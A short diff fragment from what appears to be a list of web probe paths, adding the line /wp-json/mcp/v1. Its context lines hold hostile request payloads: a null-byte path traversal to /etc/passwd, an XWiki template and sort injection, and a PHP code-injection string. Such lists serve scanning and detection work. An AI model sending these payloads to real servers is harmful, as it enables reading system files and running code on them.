@@ -253,3 +253,4 @@
 /user/login.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd
 /xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=injected
 /index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5(
+/wp-json/mcp/v1
